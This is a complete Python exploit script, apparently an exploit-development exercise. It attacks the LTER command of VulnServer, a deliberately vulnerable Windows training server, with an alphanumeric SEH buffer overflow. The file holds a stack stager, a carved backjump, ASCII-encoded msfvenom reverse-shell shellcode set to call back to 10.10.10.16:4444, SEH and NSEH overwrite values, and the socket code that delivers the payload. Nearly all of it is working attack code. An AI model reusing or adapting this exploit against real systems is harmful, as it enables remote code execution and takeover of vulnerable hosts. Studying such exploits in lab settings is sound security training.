#!/usr/bin/env python
"""
Description: AlphaNumeric Buffer Overflow (SEH) w/ shellcode carver via "LTER" in VulnServer
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 11/15/2019
Tested On: Windows XP SP2 EN

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit_seh.py 127.0.0.1 9999
"""

import socket                                                                                                                                                                                                                                 
from struct import pack                                                                                                                                                                                                                       
import sys                                                                                                                                                                                                                                    

host = sys.argv[1]                                                                                                                                                                                                                            
port = int(sys.argv[2])                                                                                                                                                                                                                       

# End of D's BEFFFF
# Beginning of A's BEF230
# A's offset: DBF (-3519 bytes)
# ESP offset from D's: 11AF (-4527 bytes)

stager = "\x54\x58" # push esp, pop eax
stager += "\x66\x05\x7f\x11" # add ax, 0x1170 | 4464 bytes
stager += "\x50\x5c" # push eax, pop esp

# Long backjump shellcode carver generated with SLink

jmp2buff = ""                                                                                                                                                                                                                                 
jmp2buff += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a                                                                                                                                                                                    
jmp2buff += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235                                                                                                                                                                                    
jmp2buff += "\x05\x77\x62\x41\x41" ## add  eax, 0x41416277                                                                                                                                                                                    
jmp2buff += "\x05\x66\x62\x41\x41" ## add  eax, 0x41416266                                                                                                                                                                                    
jmp2buff += "\x05\x55\x42\x41\x41" ## add  eax, 0x41414255                                                                                                                                                                                    
jmp2buff += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333                                                                                                                                                                                    
jmp2buff += "\x50"                 ## push eax                                                                                                                                                                                                
jmp2buff += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a                                                                                                                                                                                    
jmp2buff += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235                                                                                                                                                                                    
jmp2buff += "\x05\x42\x07\x45\x62" ## add  eax, 0x62450742                                                                                                                                                                                    
jmp2buff += "\x05\x41\x06\x44\x61" ## add  eax, 0x61440641                                                                                                                                                                                    
jmp2buff += "\x50"                 ## push eax                                                                                                                                                                                                
jmp2buff += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a                                                                                                                                                                                    
jmp2buff += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235                                                                                                                                                                                    
jmp2buff += "\x05\x32\x34\x33\x17" ## add  eax, 0x17333432                                                                                                                                                                                    
jmp2buff += "\x05\x22\x24\x33\x16" ## add  eax, 0x16332422 
jmp2buff += "\x50\x44"             ## push eax

# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.10.10.16 LPORT=4444 -b '\x00' -e x86/alpha_mixed BufferRegister=ebx -f c                                                                                                     
# Shellcode has to be ASCII-friendly or else it will die

shellcode = ("\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"                                            
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"                                                         
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"                                                         
"\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x39\x78\x4c\x42\x47\x70"                                                         
"\x33\x30\x45\x50\x71\x70\x6b\x39\x7a\x45\x66\x51\x59\x50\x53"                                                         
"\x54\x6e\x6b\x46\x30\x54\x70\x6e\x6b\x61\x42\x56\x6c\x6e\x6b"                                                         
"\x51\x42\x57\x64\x6e\x6b\x54\x32\x44\x68\x76\x6f\x48\x37\x63"                                                         
"\x7a\x77\x56\x66\x51\x39\x6f\x6c\x6c\x77\x4c\x30\x61\x31\x6c"                                                         
"\x54\x42\x76\x4c\x71\x30\x79\x51\x68\x4f\x44\x4d\x37\x71\x79"                                                         
"\x57\x59\x72\x49\x62\x53\x62\x52\x77\x6c\x4b\x70\x52\x52\x30"                                                         
"\x6e\x6b\x70\x4a\x45\x6c\x4c\x4b\x52\x6c\x32\x31\x30\x78\x4a"                                                         
"\x43\x53\x78\x75\x51\x7a\x71\x56\x31\x4e\x6b\x70\x59\x51\x30"                                                         
"\x37\x71\x78\x53\x4e\x6b\x73\x79\x32\x38\x48\x63\x34\x7a\x43"                                                         
"\x79\x6c\x4b\x65\x64\x6e\x6b\x43\x31\x7a\x76\x46\x51\x59\x6f"                                                         
"\x6c\x6c\x4b\x71\x58\x4f\x34\x4d\x75\x51\x5a\x67\x64\x78\x4d"                                                         
"\x30\x43\x45\x48\x76\x44\x43\x51\x6d\x7a\x58\x65\x6b\x61\x6d"                                                         
"\x37\x54\x33\x45\x38\x64\x62\x78\x4e\x6b\x42\x78\x74\x64\x53"                                                         
"\x31\x59\x43\x72\x46\x6c\x4b\x34\x4c\x72\x6b\x4c\x4b\x52\x78"                                                         
"\x65\x4c\x46\x61\x4a\x73\x4e\x6b\x44\x44\x4e\x6b\x53\x31\x4e"                                                         
"\x30\x6e\x69\x31\x54\x51\x34\x71\x34\x31\x4b\x73\x6b\x35\x31"                                                         
"\x32\x79\x73\x6a\x73\x61\x39\x6f\x59\x70\x63\x6f\x61\x4f\x73"
"\x6a\x6e\x6b\x67\x62\x68\x6b\x4e\x6d\x61\x4d\x70\x68\x55\x63"
"\x65\x62\x45\x50\x53\x30\x71\x78\x54\x37\x30\x73\x66\x52\x73"
"\x6f\x62\x74\x42\x48\x52\x6c\x34\x37\x37\x56\x75\x57\x6b\x4f"
"\x38\x55\x4d\x68\x6c\x50\x37\x71\x67\x70\x67\x70\x75\x79\x5a"
"\x64\x42\x74\x36\x30\x35\x38\x45\x79\x4f\x70\x70\x6b\x77\x70"
"\x39\x6f\x69\x45\x76\x30\x66\x30\x66\x30\x62\x70\x31\x50\x62"
"\x70\x47\x30\x70\x50\x75\x38\x78\x6a\x46\x6f\x6b\x6f\x79\x70"
"\x6b\x4f\x7a\x75\x4f\x67\x70\x6a\x37\x75\x62\x48\x74\x4a\x67"
"\x7a\x45\x5a\x74\x50\x72\x48\x76\x62\x65\x50\x37\x61\x43\x6c"
"\x6d\x59\x49\x76\x52\x4a\x46\x70\x32\x76\x61\x47\x43\x58\x6f"
"\x69\x39\x35\x52\x54\x35\x31\x4b\x4f\x4e\x35\x6b\x35\x4b\x70"
"\x33\x44\x36\x6c\x39\x6f\x70\x4e\x67\x78\x30\x75\x4a\x4c\x52"
"\x48\x48\x70\x78\x35\x4e\x42\x53\x66\x69\x6f\x48\x55\x55\x38"
"\x33\x53\x30\x6d\x53\x54\x73\x30\x6f\x79\x79\x73\x62\x77\x66"
"\x37\x32\x77\x56\x51\x59\x66\x33\x5a\x57\x62\x36\x39\x52\x76"
"\x69\x72\x49\x6d\x43\x56\x5a\x67\x32\x64\x66\x44\x35\x6c\x37"
"\x71\x33\x31\x4c\x4d\x71\x54\x46\x44\x66\x70\x4f\x36\x67\x70"
"\x42\x64\x30\x54\x32\x70\x30\x56\x33\x66\x53\x66\x71\x56\x43"
"\x66\x42\x6e\x50\x56\x76\x36\x73\x63\x71\x46\x42\x48\x74\x39"
"\x58\x4c\x77\x4f\x6b\x36\x39\x6f\x58\x55\x6c\x49\x6d\x30\x50"
"\x4e\x56\x36\x51\x56\x59\x6f\x74\x70\x53\x58\x63\x38\x4c\x47"
"\x57\x6d\x71\x70\x49\x6f\x4a\x75\x6f\x4b\x4d\x30\x75\x4d\x35"
"\x7a\x35\x5a\x63\x58\x6c\x66\x4a\x35\x4d\x6d\x6f\x6d\x49\x6f"
"\x4a\x75\x75\x6c\x56\x66\x61\x6c\x54\x4a\x4d\x50\x39\x6b\x79"
"\x70\x43\x45\x63\x35\x6d\x6b\x72\x67\x72\x33\x50\x72\x62\x4f"
"\x73\x5a\x35\x50\x53\x63\x49\x6f\x38\x55\x41\x41")                                                                    

# Overflowed with lter.spk "LTER /.:/(EIP @ 3520 A's)"                                                                 
# NSEH overwritten at 3495                            
# SEH overwritten at 3499

seh = pack("<I", 0x6250172B)
nseh = "\x43\x43\x75\xff"

buffer = "LTER /.:/"
buffer += "A"*12
buffer += shellcode
buffer += "A"*(3495-124-12-len(shellcode))
buffer += stager
buffer += jmp2buff
buffer += "A"*(124-len(stager)-len(jmp2buff))
buffer += nseh
buffer += seh
buffer += "D"*(1000-len(nseh)-len(seh))

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    print "[+] Sent payload with length: %d" % len(buffer)
    s.send(buffer)
    s.close()
except:
    print "[-] Something went wrong :("